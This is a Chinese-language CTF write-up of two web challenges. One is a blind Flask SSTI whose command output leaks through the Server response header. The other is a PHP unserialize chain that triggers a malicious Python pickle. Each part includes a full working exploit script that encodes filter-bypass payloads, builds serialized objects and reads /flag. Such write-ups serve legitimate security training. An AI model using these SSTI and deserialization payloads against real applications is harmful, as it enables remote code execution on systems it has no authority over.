# [XYCTF 2025] Now you see me 2
这是`Now you see me 1`的续作，环境更加苛刻，没有任何直接回显。我们需要找到一种方法来外带执行结果。

## 漏洞分析
核心的漏洞点仍然是Flask的SSTI，但是由于没有回显，我们需要利用其他方式将命令执行的结果带出来。
这里利用`werkzeug.serving.WSGIRequestHandler.server_version`，通过修改响应头中的`Server`字段，将我们想要的数据作为`Server`头的值来外带。

## 攻击流程
1.  **构造payload**:
    我们需要构造一个payload，通过SSTI修改`werkzeug.serving.WSGIRequestHandler.server_version`的值为我们命令执行的结果。
    因为大部分的关键字都被过滤了，所以payload的构造过程和`Now you see me 1`类似，通过`request.endpoint`和`request.data`来获取我们需要的字符。

2.  **外带数据**:
    我们可以通过`os.popen('whoami').read()`来执行命令并读取结果，然后将结果设置为`server_version`的值。
    ```python
    # 伪代码
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.server_version = os.popen('whoami').read()
    ```

3.  **发送请求并观察响应头**:
    发送构造好的请求后，查看返回的HTTP响应头，我们就可以在`Server`字段中看到命令执行的结果。

exp:
```python
import re
payload = []

def generate_rce_command(cmd):
    global payload
    payloadstr = "{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('werkzeug')|attr('serving')|attr('WSGIRequestHandler')|attr('__setattr__')('server_version',request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('" + cmd + "')|attr('read')()))%}"

    required_encoding = re.findall('\'([a-z0-9_ /\\.]+)\'', payloadstr)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    payload.append(fully_encoded_payload)
command = "cat /flag"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
endpoint = 'r3al_ins1de_th0ught'
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)
```

# [ISCTF 2025] 双生序列
这道题是 `来签个到吧` 的升级版，是一个涉及PHP和Python两种语言的复杂反序列化链。

## 漏洞分析
整个利用链分为PHP和Python两个部分。
### PHP部分
入口点是`api.php`，这里会从数据库读取note内容并进行反序列化。
```php
$allowed = ["Writer", "Shark", "Bridge"];
$o = @unserialize($row["content"], ["allowed_classes" => $allowed]);

if (!($o instanceof Bridge)) {
    $cat->OwO();
    exit(1);
}
...
$r = $o->fetch();
```
这里的waf限制了只允许`Writer`, `Shark`, `Bridge`三个类。并且最终反序列化的对象必须是`Bridge`。

跟进`Bridge`类：
```php
class Bridge {
    public $writer;   
    public $shark;
    
    // ...

    public function fetch() {
        $next = $this->write; // __get trigger
        if ($next instanceof Shark) {
            return $next;
        }
        return "喵喵喵!";
    }

    public function __get($name) {
        if ($name === "write") {
            if (!($this->writer instanceof Writer)){
                return "喵喵喵?";
            }
            
            $this->writer->fetch();
            return $this->shark;
        }
    }
}
```
在`fetch()`方法中，访问`$this->write`会触发`__get`魔术方法。`__get`方法中会调用`$this->writer->fetch()`，然后返回`$this->shark`。
所以我们需要控制`$this->writer`为一个`Writer`对象，`$this->shark`为一个`Shark`对象。

`Writer::fetch()`的作用是写入`/tmp/ssxl/write.bin`和`/tmp/ssxl/write.meta`文件。
`Shark`对象的作用是写入`/tmp/ssxl/run.bin`文件。

### Python部分
当我们触发了PHP反序列化链，写入了三个文件后，需要访问`run.php`来触发Python部分。
```php
// run.php
$action = $_GET["action"] ?? "喵喵喵?";

if ($action !== "run") {
    exit(1);
}

$binfile = "/tmp/ssxl/run.bin";

$allowed = ["Pytools"];
$exec = @unserialize($data, ["allowed_classes" => $allowed]);
// ...
if (method_exists($exec, "__call")) {
    $ret = $exec->blueshark(); // __call trigger
}
```
`run.php`会反序列化`/tmp/ssxl/run.bin`，并要求它是一个`Pytools`对象。然后调用一个不存在的方法`blueshark()`，这会触发`Pytools::__call`方法。

```php
// Pytools class
class Pytools extends Cat {
    // ...
    public function run() {
        $cmd = "python3 /var/www/html/pytools.py";
        $out = @shell_exec($cmd . " 2>&1");
        return $out;
    }

    public function __call($name, $args) {
        return $this->run();
    }
}
```
`__call`方法会执行`pytools.py`脚本。

`pytools.py`脚本的逻辑：
1.  加载`/tmp/ssxl/write.bin`文件，并尝试将其作为Python pickle反序列化成一个`Set`对象。
2.  加载`/tmp/ssxl/write.meta`文件。
3.  使用硬编码的密钥`kaqikaqi`对`write.bin`的内容进行HMAC校验，并与`write.meta`中的签名比对。
4.  校验成功后，获取`Set`对象的`payload`属性。
5.  最后，`pickle.loads(payload)`，触发RCE。

## 攻击流程
1.  **构造内部Python Pickle**: 构造一个可以RCE的Python Pickle payload。
2.  **构造外部Python Pickle**: 将RCE payload放入一个`Set`对象(`s`)的`payload`属性中，同时设置`s.secret = b"kaqikaqi"`。然后将这个`Set`对象pickle并base64编码。
3.  **构造PHP序列化**:
    -   构造一个`Pytools`对象的PHP序列化字符串，这将是`/tmp/ssxl/run.bin`的内容。
    -   构造一个`Shark`对象，其属性`ser`为上述`Pytools`序列化字符串。
    -   构造一个`Writer`对象，其`b64data`属性为步骤2中生成的base64编码字符串。
    -   将`Writer`和`Shark`对象包装在一个`Bridge`对象中。
    -   最后序列化这个`Bridge`对象。
4.  **触发漏洞**:
    -   将最终的`Bridge`序列化字符串发送到`index.php`，创建一个note。
    -   访问`api.php`并提供note的id，触发PHP反序列化，写入三个`.bin`和`.meta`文件。
    -   访问`run.php?action=run`，触发Python脚本执行，最终加载恶意的pickle payload，实现RCE。

## exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import pickle
import requests

TARGET = "http://challenge.bluesharkinfo.com:25507/"  # _TODO: 改成题目给的 URL_
FLAG_PATH = "/flag"                 # _TODO: 视题目实际情况改_

# === 1. Python 端：构造内外层 Pickle ===

# 本地定义一个同名 Set 类，用来生成外层 pickle
class Set:
    def __init__(self):
        self.secret = b""
        self.payload = b""

def build_inner_payload():
    _"""_
_    构造第二层的恶意 pickle，_
_    执行命令: cat FLAG_PATH > /tmp/ssxl/outs.txt_
_    """_
_    _cmd = f"cat {FLAG_PATH} > /tmp/ssxl/outs.txt"
    # 经典：cos\nsystem\n(S'cmd'\ntR.
    payload = (
        b"cos\n"
        b"system\n"
        b"(S'" + cmd.encode() + b"'\n"
        b"tR."
    )
    return payload

def build_outer_b64(inner_payload: bytes) -> str:
    _"""_
_    构造外层 Set 对象，并 base64 编码给 Writer 使用_
_    secret 必须等于 Writer::$secret = 'kaqikaqi'_
_    """_
_    _s = Set()
    s.secret = b"kaqikaqi"  # 和 PHP 里 Writer::secret 一致
    s.payload = inner_payload

    raw = pickle.dumps(s)
    return base64.b64encode(raw).decode()

# === 2. PHP 序列化构造辅助 ===

def php_str(s: str) -> str:
    _"""构造 s:<len>:"xxx"; 这种段"""_
_    _return f's:{len(s)}:"{s}";'

def build_pytools_ser() -> str:
    _"""_
_    run.bin 中的内容，只需要是一个 Pytools 对象即可_
_    """_
_    _return 'O:7:"Pytools":0:{}'

def build_writer(b64data: str) -> str:
    _"""_
_    Writer 对象的序列化_
_    """_
_    _props = (
        php_str("b64data") + php_str(b64data) +
        php_str("init")    + php_str("init")
    )
    return f'O:6:"Writer":2:{{{props}}}'

def build_shark(pytools_ser: str) -> str:
    _"""_
_    Shark 对象，唯一属性 ser = Pytools 序列化_
_    """_
_    _props = php_str("ser") + php_str(pytools_ser)
    return f'O:5:"Shark":1:{{{props}}}'

def build_bridge(b64data: str, pytools_ser: str) -> str:
    _"""_
_    Bridge(writer, shark) 序列化_
_    """_
_    _writer_ser = build_writer(b64data)
    shark_ser = build_shark(pytools_ser)

    props = (
        php_str("writer") + writer_ser +
        php_str("shark")  + shark_ser
    )
    return f'O:6:"Bridge":2:{{{props}}}'

# === 3. HTTP 交互 ===

sess = requests.Session()

def create_note(serialized_bridge: str) -> int:
    _"""_
_    步骤 1: POST /index.php 插入 note_
_    """_
_    _data = {
        "s": "blueshark:" + serialized_bridge
    }
    r = sess.post(f"{TARGET}/index.php", data=data)
    print("[*] create_note status:", r.status_code)
    note_id = int(input("[?] 请手动输入这条 note 的 id: "))
    return note_id

def trigger_api(note_id: int):
    _"""_
_    步骤 2: 访问 /api.php?id=note_id_
_    """_
_    _params = {"id": note_id}
    r = sess.get(f"{TARGET}/api.php", params=params)
    print("[*] trigger_api status:", r.status_code)

def trigger_run():
    _"""_
_    步骤 3: 访问 /run.php?action=run_
_    """_
_    _params = {"action": "run"}
    r = sess.get(f"{TARGET}/run.php", params=params)
    print("[*] trigger_run status:", r.status_code)
    print(r.text)

def main():
    inner = build_inner_payload()
    b64 = build_outer_b64(inner)
    pytools_ser = build_pytools_ser()

    bridge_ser = build_bridge(b64, pytools_ser)
    print("[*] Bridge serialized length:", len(bridge_ser))

    note_id = create_note(bridge_ser)
    trigger_api(note_id)
    trigger_run()

if __name__ == "__main__":
    main()
```
这个脚本自动化了整个攻击流程。

